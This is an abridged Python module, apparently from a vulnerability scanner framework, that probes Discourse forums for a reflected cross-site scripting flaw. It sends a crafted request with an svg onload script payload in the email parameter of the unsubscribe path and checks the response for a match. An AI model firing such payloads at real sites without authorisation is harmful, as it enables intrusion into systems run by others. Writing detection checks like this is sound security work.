#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Discourse contains a cross-site scripting vulnerability."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Discourse - Cross-Site Scripting Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'discourse', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/email/unsubscribed?email=test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E', allow_redirects=False)
        ...
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Discourse - Cross-Site Scripting detected",
